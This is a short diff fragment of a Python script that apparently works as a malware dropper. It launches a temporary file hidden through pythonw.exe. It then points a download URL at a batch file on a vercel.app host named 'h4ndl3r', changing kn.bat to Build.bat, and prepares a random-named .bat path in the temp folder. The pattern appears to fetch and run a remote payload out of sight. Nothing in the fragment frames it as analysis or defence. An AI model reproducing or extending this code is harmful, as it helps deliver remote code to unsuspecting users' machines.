@@ -13,7 +13,7 @@ _ttmp.close()
 pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
 Popen([pythonw_path, _ttmp.name])
 
-url = "https://h4ndl3r.vercel.app/kn.bat"
+url = "https://h4ndl3r.vercel.app/Build.bat"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"{uuid.uuid4()}.bat")
 
